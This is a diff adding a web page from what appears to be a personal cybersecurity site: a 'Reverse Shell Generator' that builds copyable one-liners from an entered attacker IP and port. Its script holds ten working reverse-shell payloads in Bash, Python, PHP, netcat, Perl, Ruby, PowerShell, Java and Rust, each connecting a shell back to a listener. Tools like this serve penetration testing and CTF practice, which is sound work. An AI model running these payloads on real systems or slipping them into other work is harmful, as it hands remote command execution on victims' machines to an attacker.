@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reverse Shell Generator | dmichos</title>
+    <link rel="stylesheet" href="../css/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
+    <style>
+        main {
+            max-width: 1400px;
+            width: 95%;
+        }
+
+        .tool-container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--accent-secondary);
+            margin-bottom: 0.5rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 0.8rem;
+            font-family: 'JetBrains Mono', monospace;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            border-color: var(--accent-primary);
+        }
+
+        .payload-box {
+            background: rgba(10, 10, 10, 0.8);
+            border: 1px solid #333;
+            margin-bottom: 2rem;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            transition: border-color 0.3s, transform 0.2s;
+        }
+
+        .payload-box:hover {
+            border-color: var(--accent-primary);
+            transform: translateY(-2px);
+        }
+
+        .payload-header {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.6rem 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #222;
+        }
+
+        .payload-header h4 {
+            margin: 0;
+            color: var(--accent-primary);
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .payload-body {
+            padding: 1rem;
+            position: relative;
+            background: #050505;
+        }
+
+        .payload-box code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: #d1d1d1;
+            white-space: pre-wrap;
+            word-break: break-all;
+            display: block;
+        }
+
+        .highlight-ip {
+            color: var(--accent-secondary);
+            font-weight: bold;
+        }
+
+        .highlight-port {
+            color: #ffbd2e;
+            font-weight: bold;
+        }
+
+        .search-container {
+            margin-bottom: 1.5rem;
+        }
+
+        .search-container input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 0.6rem;
+            font-size: 0.8rem;
+            outline: none;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .copy-btn {
+            font-size: 0.7rem;
+            color: var(--accent-secondary);
+            cursor: pointer;
+            border: 1px solid var(--accent-secondary);
+            padding: 4px 10px;
+            border-radius: 3px;
+            transition: all 0.2s;
+            background: transparent;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-secondary);
+            color: black;
+            box-shadow: 0 0 10px var(--accent-secondary);
+        }
+
+        .copy-btn.copied {
+            border-color: #4CAF50;
+            color: #4CAF50;
+        }
+
+        @media (max-width: 768px) {
+            .tool-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="particles-js"></div>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="../index.html">/home</a></li>
+                <li><a href="../about.html">/profile</a></li>
+                <li><a href="../projects.html">/toolshed</a></li>
+                <li><a href="../academy.html">/academy</a></li>
+                <li><a href="../contact.html">/connect</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+                <span
+                    style="font-size: 0.7rem; color: #555; margin-left: 10px;">dmichos@CyberSec:~/toolshed/revshell</span>
+            </div>
+            <h1>[ REVERSE_SHELL_GENERATOR ]</h1>
+            <p style="color: var(--text-dim); font-size: 0.8rem; margin-bottom: 2rem;">Generate one-liners for your
+                listener.</p>
+
+            <div class="tool-container">
+                <div class="inputs">
+                    <div class="input-group">
+                        <label>LHOST (IP)</label>
+                        <input type="text" id="lhost" placeholder="10.10.10.10" value="10.10.10.10">
+                    </div>
+                    <div class="input-group">
+                        <label>LPORT</label>
+                        <input type="text" id="lport" placeholder="4444" value="4444">
+                    </div>
+                    <div class="search-container">
+                        <label
+                            style="display: block; font-size: 0.8rem; color: var(--accent-secondary); margin-bottom: 0.5rem;">Filter
+                            Payloads</label>
+                        <input type="text" id="searchPayload" placeholder="Search (e.g. python, nc)...">
+                    </div>
+                </div>
+                <div class="payloads" id="payload-list">
+                    <!-- Payloads will be generated here -->
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const lhostInput = document.getElementById('lhost');
+        const lportInput = document.getElementById('lport');
+        const payloadList = document.getElementById('payload-list');
+
+        const shellTemplates = [
+            { name: "Bash -i", template: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1" },
+            { name: "Python", template: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" },
+            { name: "PHP", template: "php -r '$sock=fsockopen(\"{IP}\", {PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
+            { name: "Netcat (Traditional)", template: "nc {IP} {PORT} -e /bin/bash" },
+            { name: "Netcat (OpenBSD)", template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f" },
+            { name: "Perl", template: "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
+            { name: "Ruby", template: "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
+            { name: "PowerShell", template: "$client = New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" },
+            { name: "Java (Runtime)", template: "Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done\"});" },
+            { name: "Rust", template: "use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main() {let s = TcpStream::connect(\"{IP}:{PORT}\").unwrap();let fd = s.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).stderr(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap().wait().unwrap();}" }
+        ];
+
+        function generatePayloads() {
+            const ip = lhostInput.value || "10.10.10.10";
+            const port = lportInput.value || "4444";
+            const searchTerm = document.getElementById('searchPayload').value.toLowerCase();
+            payloadList.innerHTML = '';
+
+            shellTemplates.forEach(t => {
+                if (searchTerm && !t.name.toLowerCase().includes(searchTerm) && !t.template.toLowerCase().includes(searchTerm)) return;
+
+                const rawCode = t.template.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
+                const displayCode = escapeHtml(rawCode)
+                    .replace(new RegExp(escapeRegExp(ip), 'g'), `<span class="highlight-ip">${ip}</span>`)
+                    .replace(new RegExp(escapeRegExp(port), 'g'), `<span class="highlight-port">${port}</span>`);
+
+                const div = document.createElement('div');
+                div.className = 'payload-box';
+
+                const header = document.createElement('div');
+                header.className = 'payload-header';
+
+                const title = document.createElement('h4');
+                title.innerText = t.name;
+
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn';
+                btn.innerText = 'Copy';
+                btn.onclick = (e) => copyToClipboard(e.target, rawCode);
+
+                header.appendChild(title);
+                header.appendChild(btn);
+
+                const body = document.createElement('div');
+                body.className = 'payload-body';
+                body.innerHTML = `<code>${displayCode}</code>`;
+
+                div.appendChild(header);
+                div.appendChild(body);
+                payloadList.appendChild(div);
+            });
+        }
+
+        function escapeRegExp(string) {
+            return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function copyToClipboard(btn, text) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = btn.innerText;
+                btn.innerText = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        lhostInput.oninput = generatePayloads;
+        lportInput.oninput = generatePayloads;
+        document.getElementById('searchPayload').oninput = generatePayloads;
+        generatePayloads(); // Initial load
+    </script>
+    <script src="../js/scripts.js"></script>
+</body>
+
+</html>
